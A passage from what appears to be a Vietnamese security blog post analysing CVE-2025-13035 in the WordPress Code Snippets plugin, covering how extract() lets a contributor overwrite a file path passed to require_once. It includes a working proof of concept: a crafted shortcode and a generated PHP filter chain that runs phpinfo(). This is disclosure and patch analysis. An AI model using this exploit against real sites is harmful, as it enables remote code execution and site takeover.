&lt;code&gt;render_content_shortcode&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function render_content_shortcode( array $atts ): string {&#xA;    $atts = $this-&amp;gt;convert_boolean_attribute_flags( $atts, [ &amp;#39;network&amp;#39;, &amp;#39;php&amp;#39;, &amp;#39;format&amp;#39;, &amp;#39;shortcodes&amp;#39;, &amp;#39;debug&amp;#39; ] );&#xA;    $original_atts = $atts;&#xA;&#xA;    $atts = shortcode_atts(&#xA;        [&#xA;            &amp;#39;id&amp;#39;         =&amp;gt; 0,&#xA;            &amp;#39;snippet_id&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;network&amp;#39;    =&amp;gt; false,&#xA;            &amp;#39;php&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;format&amp;#39;     =&amp;gt; false,&#xA;            &amp;#39;shortcodes&amp;#39; =&amp;gt; false,&#xA;            &amp;#39;debug&amp;#39;      =&amp;gt; false,&#xA;        ],&#xA;        $atts,&#xA;        self::CONTENT_SHORTCODE&#xA;    );&#xA;&#xA;    $id = 0 !== intval( $atts[&amp;#39;snippet_id&amp;#39;] ) ? intval( $atts[&amp;#39;snippet_id&amp;#39;] ) : intval( $atts[&amp;#39;id&amp;#39;] );&#xA;    if ( ! $id ) {&#xA;        return $this-&amp;gt;invalid_id_warning( $id );&#xA;    }&#xA;&#xA;    $snippet = $this-&amp;gt;get_snippet( $id, (bool) $atts[&amp;#39;network&amp;#39;], &amp;#39;html&amp;#39; );&#xA;&#xA;    // Render the source code if this is not a shortcode snippet.&#xA;    if ( &amp;#39;content&amp;#39; !== $snippet-&amp;gt;scope ) {&#xA;        return $snippet-&amp;gt;id ? $this-&amp;gt;render_snippet_source( $snippet ) : $this-&amp;gt;invalid_id_warning( $snippet-&amp;gt;id );&#xA;    }&#xA;    ...&#xA;    $content = $this-&amp;gt;evaluate_shortcode_content( $snippet, $original_atts );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm tạo ra một đối tượng &lt;strong&gt;Snippet&lt;/strong&gt; bằng cách gọi phương thức &lt;code&gt;get_snippet&lt;/code&gt;. Phương thức nhận vào ba tham số: ID của snippet, giá trị boolean cho biết có sử dụng chế độ &lt;strong&gt;network&lt;/strong&gt; hay không, và định dạng mong muốn (&lt;strong&gt;html&lt;/strong&gt;). Kết quả trả về là một đối tượng &lt;strong&gt;Snippet&lt;/strong&gt; chứa toàn bộ thông tin cần thiết để tiếp tục xử lý.&lt;/p&gt;&#xA;&lt;p&gt;Tiếp theo, hàm kiểm tra phạm vi (&lt;strong&gt;scope&lt;/strong&gt;) của snippet. Nếu snippet &lt;strong&gt;không&lt;/strong&gt; thuộc loại &lt;strong&gt;content&lt;/strong&gt; (&lt;code&gt;html&lt;/code&gt;)&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/content.png&#34; title=&#34;Content khi tạo Snippet&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/content.png&#34; data-sub-html=&#34;&lt;h2&gt;Content&lt;/h2&gt;&lt;p&gt;Content khi tạo Snippet&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/content.png&#39; alt=&#34;Content&#34; height=&#34;549&#34; width=&#34;1036&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content khi tạo Snippet&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;plugin sẽ không xử lý nội dung mà thay vào đó trả về phần mã nguồn của snippet.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;evaluate_shortcode_content()&lt;/code&gt; được gọi để xử lý nội dung shortcode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function evaluate_shortcode_content( Snippet $snippet, array $atts ): string {&#xA;    if ( empty( $atts[&amp;#39;php&amp;#39;] ) ) {&#xA;        return $snippet-&amp;gt;code;&#xA;    }&#xA;&#xA;    if ( ! Snippet_Files::is_active() ) {&#xA;        return $this-&amp;gt;evaluate_shortcode_from_db( $snippet, $atts );&#xA;    }&#xA;&#xA;    $network = DB::validate_network_param( $snippet-&amp;gt;network );&#xA;    $table_name = Snippet_Files::get_hashed_table_name( code_snippets()-&amp;gt;db-&amp;gt;get_table_name( $network ) );&#xA;    $filepath = $this-&amp;gt;build_snippet_flat_file_path( $table_name, $snippet );&#xA;&#xA;    return file_exists( $filepath )&#xA;        ? $this-&amp;gt;evaluate_shortcode_from_flat_file( $filepath, $atts )&#xA;        : $this-&amp;gt;evaluate_shortcode_from_db( $snippet, $atts );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm kiểm tra xem thuộc tính &lt;code&gt;php&lt;/code&gt; có tồn tại hay không. Nếu không, trả về mã nguồn gốc của snippet mà không thực thi.&#xA;Nếu thuộc tính &lt;code&gt;php&lt;/code&gt; tồn tại nhưng file lưu trữ chưa tồn tại, hàm chuyển sang phương thức xử lý trực tiếp từ cơ sở dữ liệu.&lt;/p&gt;&#xA;&lt;p&gt;File lưu trữ được khai báo:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private const ENABLED_FLAG_FILE = &amp;#39;flat-files-enabled.flag&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Để hàm không return ở đây, ta phải bật option &lt;code&gt;Enable file-based execution&lt;/code&gt; trong admin panel:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/enable.png&#34; title=&#34;Enable file-based execution&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Enable file-based execution&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/enable.png&#39; alt=&#34;Enable&#34; height=&#34;810&#34; width=&#34;982&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable file-based execution&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi đó file lưu trữ được tạo nằm trong &lt;code&gt;wp-content/code-snippets&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/file.png&#34; title=&#34;flat-files-enabled.flag được tạo&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/file.png&#34; data-sub-html=&#34;&lt;h2&gt;File&lt;/h2&gt;&lt;p&gt;flat-files-enabled.flag được tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/file.png&#39; alt=&#34;File&#34; height=&#34;253&#34; width=&#34;561&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;flat-files-enabled.flag được tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi file đã tồn tại, hàm tiến hành xác định thông tin mạng của snippet, lấy tên bảng đã được băm (hash) và xây dựng đường dẫn đến file chứa nội dung của snippet gán vào &lt;code&gt;$filepath&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;$filepath&lt;/code&gt; tồn tại hàm gọi đến &lt;code&gt;evaluate_shortcode_from_flat_file( $filepath, $atts )&lt;/code&gt; nơi xảy ra lỗ hổng.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Lổ hổng được công bố với đặc quyền Contributor vì đây là đặc quyền thấp nhất để chèn shortcode vào post&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor inserts [code_snippet] shortcode&amp;#34;] --&amp;gt; B[&amp;#34;WordPress calls render_content_shortcode()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;convert_boolean_attribute_flags()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;shortcode_atts(): merge defaults into $atts&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Determine snippet_id → if invalid → invalid_id_warning()&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;get_snippet(id, network, &amp;#39;html&amp;#39;) → create Snippet object&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;snippet.scope == &amp;#39;content&amp;#39;?&amp;#34;}&#xA;&#xA;G -- No --&amp;gt; H[&amp;#34;render_snippet_source()&amp;#34;]&#xA;H --&amp;gt; Z[&amp;#34;End&amp;#34;]&#xA;&#xA;G -- Yes --&amp;gt; I[&amp;#34;evaluate_shortcode_content(snippet, original_atts)&amp;#34;]&#xA;&#xA;I --&amp;gt; J{&amp;#34;original_atts[&amp;#39;php&amp;#39;] enabled?&amp;#34;}&#xA;J -- No --&amp;gt; K[&amp;#34;Return snippet-&amp;gt;code&amp;#34;] --&amp;gt; Z&#xA;&#xA;J -- Yes --&amp;gt; L{&amp;#34;Snippet_Files::is_active()?&amp;#34;}&#xA;&#xA;L -- No --&amp;gt; M[&amp;#34;evaluate_shortcode_from_db()&amp;#34;] --&amp;gt; Z&#xA;&#xA;L -- Yes --&amp;gt; N[&amp;#34;Build file path: build_snippet_flat_file_path()&amp;#34;]&#xA;N --&amp;gt; O{&amp;#34;Does file exist?&amp;#34;}&#xA;&#xA;O -- No --&amp;gt; M&#xA;&#xA;O -- Yes --&amp;gt; P[&amp;#34;evaluate_shortcode_from_flat_file(filepath, atts)&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;extract(atts) inside IIFE&amp;#34;]&#xA;Q --&amp;gt; R{&amp;#34;Do atts contain variable-name collisions (e.g., &amp;#39;filepath&amp;#39;)?&amp;#34;}&#xA;&#xA;R -- No --&amp;gt; S[&amp;#34;require_once filepath (safe)&amp;#34;] --&amp;gt; Z&#xA;&#xA;R -- Yes --&amp;gt; T[&amp;#34;Internal variable overwritten → filepath replaced&amp;#34;]&#xA;T --&amp;gt; U[&amp;#34;require_once attacker-controlled file&amp;#34;]&#xA;U --&amp;gt; V[&amp;#34;RCE achieved&amp;#34;]&#xA;V --&amp;gt; Z&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Administrator bật option &lt;code&gt;Enable file-based execution&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Contributor chèn shortcode sau vào post với &lt;code&gt;snippet_id&lt;/code&gt; trỏ đến Snippet có Snippet Type là HTML(&lt;code&gt;content&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[code_snippet snippet_id=4 php=1 filepath=/path/to/file]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ở đây attacker có toàn quyền điều khiển giá trị của biến &lt;code&gt;filepath&lt;/code&gt;. Điều đó cho phép sử dụng các PHP stream wrappers (chẳng hạn filter chain) để dẫn tới thực thi mã, vì:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;require_once&lt;/code&gt; chỉ kiểm tra xem chuỗi nhận vào có phải là một đường dẫn hợp lệ theo PHP hay không; nó sẽ cố gắng nạp &lt;strong&gt;bất kỳ&lt;/strong&gt; stream nào được cung cấp mà không giới hạn ở file vật lý.&lt;/li&gt;&#xA;&lt;li&gt;PHP filter chain cho phép biến đổi nội dung stream và khiến PHP diễn giải kết quả cuối cùng như mã PHP hợp lệ. Khi nội dung sau filter được đưa vào &lt;code&gt;require_once&lt;/code&gt;, PHP sẽ thực thi nó.&lt;/li&gt;&#xA;&lt;li&gt;Nhiều wrapper như &lt;code&gt;http://&lt;/code&gt; hoặc &lt;code&gt;ftp://&lt;/code&gt; bị hạn chế bởi cấu hình mặc định &lt;code&gt;allow_url_include&lt;/code&gt;, nhưng các wrapper nội bộ như &lt;code&gt;php://filter&lt;/code&gt; không bị ảnh hưởng bởi giới hạn này.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Filter chain&lt;/strong&gt; trong PHP là cơ chế cho phép bạn nối nhiều bộ lọc (stream filters) lại với nhau để xử lý dữ liệu khi đọc hoặc ghi từ một file/stream. Nó hoạt động dựa trên wrapper đặc biệt: &lt;code&gt;php://filter&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Kỹ thuật này được sử dụng trong các cuộc thi CTF, dựa trên nguyên lý sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;php://filter&lt;/code&gt;: cho phép gắn filter vào một stream (ở đây là &lt;code&gt;php://temp&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Chuỗi filter: các filter được nối bằng ký tự &lt;code&gt;|&lt;/code&gt;. Dữ liệu đi qua từng filter theo thứ tự từ trái sang phải.&lt;/li&gt;&#xA;&lt;li&gt;Các filter chính trong chuỗi:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;convert.iconv.&amp;lt;from&amp;gt;&lt;/code&gt;.&lt;code&gt;&amp;lt;to&amp;gt;&lt;/code&gt;: chuyển đổi encoding từ bộ mã này sang bộ mã khác.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;convert.base64-encode&lt;/code&gt; / &lt;code&gt;convert.base64-decode&lt;/code&gt;: mã hóa hoặc giải mã base64.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi kết hợp hàng chục filter như vậy, dữ liệu sẽ bị biến đổi nhiều lần: encode → đổi encoding → decode → encode → … cho đến cuối cùng.&#xA;Tham khảo: &lt;a href=&#34;https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Chạy &lt;a href=&#34;https://github.com/synacktiv/php_filter_chain_generator/tree/main&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;script&lt;/a&gt; sau để tạo PHP Filter Chain:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ python3 php_filter_chain_generator.py --chain &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;  &amp;#39;&#xA;[&amp;#43;] The following gadget chain will generate the following code : &amp;lt;?php phpinfo(); ?&amp;gt;   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)&#xA;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gán giá trị vừa tạo được cho &lt;code&gt;filepath&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/result.png&#39; alt=&#34;Result&#34; height=&#34;862&#34; width=&#34;1494&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong plugin Code Snippets xuất phát từ việc sử dụng &lt;code&gt;extract()&lt;/code&gt; mà không có cơ chế bảo vệ, cho phép ghi đè biến nội bộ và dẫn đến việc thực thi file tuỳ ý thông qua &lt;code&gt;require_once&lt;/code&gt;. Khi kết hợp với tùy chọn “Enable file-based execution” và shortcode &lt;code&gt;[code_snippet]&lt;/code&gt;, một người dùng có quyền Contributor có thể kích hoạt thực thi mã PHP không mong muốn. Bản vá đã khắc phục vấn đề bằng cách sử dụng &lt;code&gt;EXTR_SKIP&lt;/code&gt;, đảm bảo các biến nhạy cảm không bị ghi đè trong quá trình xử lý shortcode.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Việc sử dụng &lt;code&gt;extract()&lt;/code&gt; mà không kiểm soát biến là rủi ro nghiêm trọng, đặc biệt khi dữ liệu đầu vào đến từ người dùng.&lt;/li&gt;&#xA;&lt;li&gt;PHP stream wrappers, bao gồm filter chains, có thể trở thành công cụ mạnh mẽ để chuyển đổi dữ liệu thành mã thực thi.&lt;/li&gt;&#xA;&lt;li&gt;Một tùy chọn cấu hình tưởng chừng vô hại như “Enable file-based execution” có thể mở rộng bề mặt tấn công đáng kể.&lt;/li&gt;&#xA;&lt;li&gt;Các shortcode WordPress cần được xử lý cẩn trọng vì chúng được Contributor sử dụng trong nội dung bài viết.&lt;/li&gt;&#xA;&lt;li&gt;Việc bổ sung &lt;code&gt;EXTR_SKIP&lt;/code&gt; trong bản vá cho thấy cách đơn giản nhưng hiệu quả để giảm thiểu nguy cơ ghi đè biến nhạy cảm.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 